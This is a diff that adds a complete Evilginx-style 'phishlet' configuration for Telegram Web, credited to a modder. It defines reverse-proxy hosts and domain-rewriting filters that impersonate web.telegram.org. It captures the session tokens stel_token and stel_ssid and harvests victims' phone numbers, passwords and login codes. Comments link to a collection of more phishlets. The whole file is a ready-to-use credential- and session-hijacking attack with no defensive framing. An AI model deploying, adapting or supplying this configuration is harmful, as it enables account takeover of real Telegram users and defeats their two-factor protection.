@@ -1,0 +1,40 @@
+name: 'Telegram Phishlet'
+author: 'HTB (Mode by LxKh4n1yn-Kali-linuX)'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - { phish_sub: 'web', orig_sub: 'web', domain: 'telegram.org', session: true, is_landing: true }
+  - { phish_sub: 'api', orig_sub: 'api', domain: 'telegram.org', session: false, is_landing: false }
+
+sub_filters: 
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'web.telegram.org', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'api.telegram.org', replace: 'api.{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'text/plain']}
+  - { triggers_on: 'web.telegram.org', hostname: '{hostname}', sub: 'web', orig_sub: 'web', domain: 'telegram.org', search: 'web.telegram.org', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}
+
+auth_tokens:
+  - domain: 'telegram.org'
+    keys: ['stel_token', 'stel_ssid']
+
+credentials:
+  username:
+    key: 'phone'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  code:
+    key: 'code'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'web.telegram.org'
+  path: '/'
+  url: https://web.telegram.org/
+
+# This is a Telegram phishlet configured for web.telegram.org
+# You can find more phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets & www.simplerhacking.com
+# Upgraded and modified by LxKh4n1yn-Kali-linuX
+# Modified by LxKhaninScientist
